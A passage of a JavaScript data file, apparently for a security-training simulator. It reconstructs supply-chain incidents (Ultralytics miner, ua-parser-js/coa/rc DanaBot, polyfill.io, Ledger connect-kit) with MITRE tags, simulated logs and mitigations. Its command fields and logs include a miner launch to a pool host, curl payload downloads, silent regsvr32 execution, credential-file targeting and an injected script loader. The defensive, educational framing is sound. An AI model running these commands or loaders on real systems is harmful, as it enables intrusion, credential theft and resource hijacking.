        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)',
        narration:
          'When AI engineers or automated ML pipelines run pip install ultralytics and import the library, downloads.py fetches and executes /tmp/ultralytics_runner (XMRig) connecting to connect.consrensys.com:8080 and deletes the binary from disk while keeping it running in memory.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1496 - Resource Hijacking)',
        technicalCommands: [
          'chmod +x /tmp/ultralytics_runner && /tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080',
          'os.remove("/tmp/ultralytics_runner") (Unlinks binary from filesystem while process remains resident)',
        ],
        defenseMitigation:
          'Pin Python dependencies with cryptographic hashes (`pip install --require-hashes`) and monitor ML cluster nodes for unlinked binaries executing from /tmp.',
        logs: [
          {
            id: 'ultra-3',
            timestamp: '04:33:09.118',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'ultralytics_runner',
            CommandLine: '/tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080',
            raw: 'Linux Runtime Alert | Process: /tmp/ultralytics_runner (deleted) | Parent: /usr/bin/python3 | NetworkConnection: connect.consrensys.com:8080 (Stratum Mining Protocol) | Note: Unlinked ELF executing from /tmp',
            parsedFields: {
              PayloadPath: '/tmp/ultralytics_runner (unlinked after start)',
              C2Pool: 'connect.consrensys.com:8080',
              PayloadFamily: 'XMRig Cryptominer',
            },
          },
        ],
        packets: [
          {
            id: 'ultra-pkt-1',
            timestamp: '04:33:09.400',
            protocol: 'TCP',
            sourceIp: '10.40.12.88',
            destIp: '198.51.100.210',
            port: 8080,
            flag: 'PSH-ACK',
            payloadSize: 256,
            hexDump: '7B 22 69 64 22 3A 31 2C 22 6A 73 6F 6E 72 70 63 22 3A 22 32 2E 30 22 2C 22 6D 65 74 68 6F 64 22 3A 22 6C 6F 67 69 6E 22 7D',
            decodedString: '{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"4BHRQ...","agent":"XMRig"}}',
          },
        ],
      },
    ],
  },
  {
    id: 'npm-ua-parser-js-coa-rc-supply-chain',
    title: 'NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'Threat actors compromise the npm maintainer accounts of ubiquitous JavaScript packages (ua-parser-js, coa, and rc) and inject malicious preinstall lifecycle hooks that execute compile.bat / sdd.dll via regsvr32.exe -s to deploy the DanaBot credential stealer.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Hijacked NPM Account & Payload Server', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NPM Registry (ua-parser-js / coa / rc)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Developer Workstation (npm install)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Endpoint EDR & NPM Audit Guard', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Browser Session Vault & Cloud Tokens', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Maintainer Account Takeover & Malicious preinstall Hook Publish',
        narration:
          'Attackers compromise the npm registry credentials of maintainers lacking hardware 2FA and publish trojanized minor versions (ua-parser-js 0.7.29, coa 2.0.3, rc 1.2.9) containing a "preinstall": "node preinstall.js" lifecycle hook in package.json.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.001 - Compromise Software Dependencies)',
        technicalCommands: [
          'package.json injection: "scripts": { "preinstall": "node preinstall.js" }',
          'npm publish ua-parser-js@0.7.29 / coa@2.0.3 / rc@1.2.9',
        ],
        defenseMitigation:
          'Commit lockfiles (package-lock.json / pnpm-lock.yaml), run npm ci --ignore-scripts in CI environments, and enforce WebAuthn 2FA for package publishing.',
        logs: [
          {
            id: 'npm-1',
            timestamp: '13:15:02.100',
            source: 'WAF',
            severity: 'critical',
            raw: 'NPM Registry Integrity Alert | Packages: ua-parser-js@0.7.29, coa@2.0.3, rc@1.2.9 | Anomaly: Newly added "preinstall" script invoking obfuscated compile.js / preinstall.js',
            parsedFields: {
              AffectedPackages: 'ua-parser-js (0.7.29), coa (2.0.3), rc (1.2.9)',
              InjectedLifecycleHook: 'scripts.preinstall -> node preinstall.js',
              WeeklyDownloadReach: '> 20 Million Combined Downloads/Week',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Automatic preinstall Execution & curl Download of sdd.dll',
        narration:
          'When a developer or build server runs npm install without a pinned lockfile, npm automatically executes preinstall.js, which spawns compile.bat to download a malicious payload (sdd.dll) from 159.148.186.228 and save it as create.dll.',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Execution (T1059.007 - JavaScript / T1059.003 - Windows Command Shell)',
        technicalCommands: [
          'node preinstall.js -> spawns cmd.exe /c compile.bat',
          'curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe && curl https://citationsheriff.com/sdd.dll -o create.dll',
        ],
        defenseMitigation:
          'Configure developer workstations with global npm config `ignore-scripts=true` and monitor node.exe spawning cmd.exe or powershell.exe during package installation.',
        logs: [
          {
            id: 'npm-2',
            timestamp: '13:18:40.512',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'cmd.exe',
            CommandLine: 'cmd.exe /c compile.bat',
            raw: 'EventID: 1 | ParentImage: C:\\Program Files\\nodejs\\node.exe | Image: C:\\Windows\\System32\\cmd.exe | CommandLine: cmd.exe /c compile.bat | ChildCommand: curl https://citationsheriff.com/sdd.dll -o create.dll',
            parsedFields: {
              ParentProcess: 'node.exe (npm preinstall hook)',
              BatchDropper: 'compile.bat',
              DownloadedDll: 'sdd.dll -> saved as create.dll',
            },
          },
        ],
        packets: [
          {
            id: 'npm-pkt-1',
            timestamp: '13:18:40.900',
            protocol: 'HTTPS',
            sourceIp: '10.10.5.21',
            destIp: '159.148.186.228',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1460,
            hexDump: '47 45 54 20 2F 73 64 64 2E 64 6C 6C 20 48 54 54 50 2F 31 2E 31 0D 0A 4D 5A 90 00 03 00 00 00',
            decodedString: 'GET /sdd.dll HTTP/1.1 -> Returns PE32+ DLL (DanaBot Dropper create.dll)',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Silent regsvr32.exe -s Execution & DanaBot Credential Theft',
        narration:
          'The batch script executes regsvr32.exe -s create.dll to silently run the DanaBot banking/infostealer DLL via system proxy execution, harvesting saved browser credentials, cookies, SSH keys, and cloud CLI tokens from the developer machine.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Defense Evasion & Credential Access (T1218.010 - Regsvr32 / T1555)',
        technicalCommands: [
          'regsvr32.exe -s create.dll',
          'DanaBot Stealer: Reads %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data & ~/.aws/credentials',
        ],
        defenseMitigation:
          'Block regsvr32.exe from loading unsigned DLLs located in user-writable project directories or node_modules folders via WDAC/AppLocker rules.',
        logs: [
          {
            id: 'npm-3',
            timestamp: '13:18:44.019',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'regsvr32.exe',
            CommandLine: 'regsvr32.exe -s create.dll',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\System32\\cmd.exe | Image: C:\\Windows\\System32\\regsvr32.exe | CommandLine: regsvr32.exe -s create.dll | Payload: DanaBot Credential Stealer',
            parsedFields: {
              SystemBinaryProxy: 'regsvr32.exe -s create.dll',
              MalwareFamily: 'DanaBot InfoStealer + XMRig (jsextension.exe)',
              TargetedAssets: 'Chrome Login Data, Cookies, AWS/Git Credentials',
              MitreTechnique: 'T1218.010 (System Binary Proxy Execution: Regsvr32)',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'polyfill-io-cdn-domain-supply-chain',
    title: 'cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection (CVE-2024-38526)',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Following the acquisition of the polyfill.io domain (embedded across 100,000+ websites without Subresource Integrity), the new operator modifies the CDN edge servers to dynamically inject obfuscated JavaScript into mobile visitors while returning clean polyfills to desktop admins and crawlers.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Rogue CDN Operator (cdn.polyfill.io)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Enterprise Web Portal (<script src=...)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'End-User Mobile Browser Session', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Sansec Scanner / Cloudflare Page Shield', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'DOM Session Context & Redirect Target', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI)',
        narration:
          'Over 100,000 production web applications include <script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> without an integrity="sha384-..." attribute, delegating full DOM execution trust to the external domain owner.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          '<script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> (Missing integrity & crossorigin attributes)',
        ],
        defenseMitigation:
          'Eliminate external polyfill CDNs or enforce Subresource Integrity (SRI) hashes (`integrity="sha384-..."`) and strict Content-Security-Policy (`script-src`) directives.',
        logs: [
          {
            id: 'poly-1',
            timestamp: '09:10:12.004',
            source: 'WAF',
            severity: 'warning',
            raw: 'Page Shield Inventory Alert | ScriptURL: https://cdn.polyfill.io/v2/polyfill.min.js | SubresourceIntegrity: MISSING | DomainOwnershipStatus: Transferred to Funnull (CVE-2024-38526)',
            parsedFields: {
              ExternalScriptUrl: 'https://cdn.polyfill.io/v2/polyfill.min.js',
              SriStatus: 'Missing integrity attribute',
              CveId: 'CVE-2024-38526',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation',
        narration:
          'When a client browser requests polyfill.min.js, the rogue CDN edge server inspects the HTTP User-Agent, Referer, and time-of-day, serving clean code to desktop browsers and web crawlers while appending heavily obfuscated JavaScript to mobile User-Agents.',
        activeNodes: ['attacker', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1027 - Obfuscated Files or Information)',
        technicalCommands: [
          'GET /v2/polyfill.min.js HTTP/2 | User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)',
          'CDN Conditional Injection: Checks !window.google_analytics_admin && delayed setTimeout(eval(...), 15000)',
        ],
        defenseMitigation:
          'Enable Cloudflare automatic polyfill.io URL rewriting (redirecting to cdnjs.cloudflare.com/polyfill) and monitor client-side CSP violation reports.',
        logs: [
          {
            id: 'poly-2',
            timestamp: '09:10:14.330',
            source: 'WAF',
            severity: 'critical',
            raw: 'Sansec Client-Side Script Integrity Alert | Source: https://cdn.polyfill.io/v2/polyfill.min.js | UserAgent: iPhone OS 17_5 | PayloadDiff: Appended obfuscated closure injecting https://www.googie-anaiytics.com/gtags.js',
            parsedFields: {
              TargetCondition: 'Mobile User-Agent + Non-Admin Session',
              InjectedDomain: 'www.googie-anaiytics.com (Typosquatted Loader)',
              EvasionTechnique: '15-second delayed execution + crawler User-Agent bypass',
            },
          },
        ],
        packets: [
          {
            id: 'poly-pkt-1',
            timestamp: '09:10:14.310',
            protocol: 'HTTPS',
            sourceIp: '104.244.43.12',
            destIp: '172.16.80.19',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1420,
            hexDump: '2F 2A 20 50 6F 6C 79 66 69 6C 6C 20 73 65 72 76 69 63 65 20 76 33 2E 31 31 30 2E 31 20 2A 2F 28 66 75 6E 63 74 69 6F 6E 28 77 2C 64 29 7B',
            decodedString: '/* Polyfill service v3.110.1 */ (function(w,d){setTimeout(function(){var s=d.createElement("script");s.src="https://www.googie-anaiytics.com/gtags.js";d.head.appendChild(s)},15000)})(window,document);',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection',
        narration:
          'Executing inside the host website’s first-party origin, the injected script has unrestricted access to document.cookie, localStorage, and the DOM, loading secondary scripts from www.googie-anaiytics.com and hijacking user navigation.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Collection & Impact (T1185 - Browser Session Hijacking)',
        technicalCommands: [
          'DOM Execution in First-Party Origin: Access to document.cookie, window.localStorage, and location.replace()',
        ],
        defenseMitigation:
          'Deploy Content-Security-Policy (CSP) with strict-dynamic or explicit script hashes and place compromised third-party domains on registrar clientHold.',
        logs: [
          {
            id: 'poly-3',
            timestamp: '09:10:29.501',
            source: 'WAF',
            severity: 'critical',
            raw: 'CSP Report-Only Violation | BlockedURI: https://www.googie-anaiytics.com/gtags.js | DocumentURI: https://checkout.enterprise.example.com/ | ViolatedDirective: script-src-elem',
            parsedFields: {
              HostOrigin: 'https://checkout.enterprise.example.com',
              SecondaryPayloadUri: 'https://www.googie-anaiytics.com/gtags.js',
              SecurityImpact: 'Full First-Party DOM & Storage Access',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'ledger-connect-kit-npmjs-drainer',
    title: 'Ledger Connect-Kit NPM Compromise & Web3 WalletConnect Drainer',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'An attacker spear-phishes a former Ledger employee’s unrevoked npmjs credentials and publishes malicious versions (1.1.5–1.1.7) of @ledgerhq/connect-kit. Downstream dApps pulling the unpinned CDN bundle from jsDelivr automatically render a rogue WalletConnect modal deploying the Angel Drainer smart contract payload.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Angel Drainer Operator & Rogue ProjectID', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NPM & jsDelivr CDN (@ledgerhq/connect-kit)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Downstream Web3 dApp Frontend', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Blockaid Web3 Runtime Scanner', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'User Web3 Wallet (Permit2 / SetApprovalForAll)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Former Employee NPM Token Phishing & Publish of v1.1.5–1.1.7',
        narration:
          'After phishing a former employee who still retained publish access to the @ledgerhq npm organization without GitHub release gating, the attacker publishes @ledgerhq/connect-kit versions 1.1.5, 1.1.6, and 1.1.7 directly to the public npm registry.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.001 - Compromise Software Dependencies)',
        technicalCommands: [
          'npm publish @ledgerhq/connect-kit@1.1.5 (Published directly via compromised npm token bypassing GitHub CI)',
        ],
        defenseMitigation:
          'Enforce SSO/SCIM offboarding across package registries (npm, PyPI, Docker Hub) and require OIDC Trusted Publishing tied exclusively to protected GitHub release workflows.',
        logs: [
          {
            id: 'ledger-1',
            timestamp: '09:38:11.002',
            source: 'Auth',
            severity: 'critical',
            raw: 'NPM Registry Publish Event | Package: @ledgerhq/connect-kit | Versions: 1.1.5, 1.1.6, 1.1.7 | Publisher: unrevoked-employee-account | GitHubReleaseTag: MISSING (Direct CLI publish)',
            parsedFields: {
              CompromisedPackage: '@ledgerhq/connect-kit',
              MaliciousVersions: '1.1.5, 1.1.6, 1.1.7',
              RootCause: 'Unrevoked former employee npmjs publish privileges',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader',
        narration:
          'Because `@ledgerhq/connect-kit-loader` dynamically fetches the latest version from `https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1` without a pinned patch version or SRI hash, hundreds of Web3 frontends (including SushiSwap and Revoke.cash) immediately serve the trojanized bundle.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.007 - JavaScript)',
        technicalCommands: [
          'GET https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1/dist/umd/index.min.js (Resolves to 1.1.7)',
          'Injected Rogue WalletConnect ProjectID: 89618723618723...',
        ],
        defenseMitigation:
          'Never dynamically load unpinned major-version scripts (`@1`) from public CDNs at runtime; bundle dependencies at build time with locked SHA-512 integrity hashes in package-lock.json.',
        logs: [
          {
            id: 'ledger-2',
            timestamp: '10:43:05.419',
            source: 'WAF',
            severity: 'critical',
            raw: 'Blockaid Frontend Integrity Alert | Loader: @ledgerhq/connect-kit-loader | FetchedCDNUrl: https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1/dist/umd/index.min.js | ResolvedVersion: 1.1.7 | InjectedPayload: Angel Drainer WalletConnect Modal',
            parsedFields: {
              DynamicLoader: '@ledgerhq/connect-kit-loader',
              UnpinnedCdnUrl: 'cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1',
              DrainerFamily: 'Angel Drainer',
            },
          },
        ],
        packets: [
          {
            id: 'ledger-pkt-1',
            timestamp: '10:43:05.400',
            protocol: 'HTTPS',
            sourceIp: '104.16.89.20',
            destIp: '192.0.2.99',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1460,
            hexDump: '47 45 54 20 2F 6E 70 6D 2F 40 6C 65 64 67 65 72 68 71 2F 63 6F 6E 6E 65 63 74 2D 6B 69 74 40 31 2F 64 69 73 74 2F 75 6D 64 2F 69 6E 64 65 78 2E 6D 69 6E 2E 6A 73',
            decodedString: 'GET /npm/@ledgerhq/connect-kit@1/dist/umd/index.min.js -> Serves v1.1.7 containing Angel Drainer',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain',
        narration:
          'When a user visits an affected dApp, the malicious script overlays a counterfeit WalletConnect modal routing through a rogue WalletConnect project ID, prompting the user’s software/hardware wallet to sign EIP-712 Permit2 signatures or setApprovalForAll transactions that drain tokens to the attacker.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1657 - Financial Theft)',
        technicalCommands: [
          'eth_signTypedData_v4 (EIP-712 Permit2 batch allowance to Angel Drainer contract 0x0000...)',
          'WalletConnect Relay Revocation: WalletConnect blocks rogue ProjectID & jsDelivr purges CDN cache for v1.1.5-1.1.7',
        ],
        defenseMitigation:
          'Integrate real-time transaction simulation (e.g., Blockaid) inside wallet interfaces to warn users before signing Permit2 or setApprovalForAll calls to untrusted spender contracts.',
        logs: [
          {
            id: 'ledger-3',
            timestamp: '10:51:18.882',
            source: 'WAF',
            severity: 'critical',
            raw: 'Blockaid Transaction Simulation Alert | Method: eth_signTypedData_v4 (Permit2) | SpenderAddress: 0x2260...AngelDrainer | Origin: trusted-dapp.example.com | Verdict: MALICIOUS_DRAINER_BLOCKED',
            parsedFields: {
              RpcMethod: 'eth_signTypedData_v4 (EIP-712 Permit2)',
              MaliciousSpender: 'Angel Drainer Contract',
              MitigationAction: 'WalletConnect ProjectID Revoked & Patched in v1.1.8',
            },
          },
        ],
        packets: [],
      },
    ],
  },
];
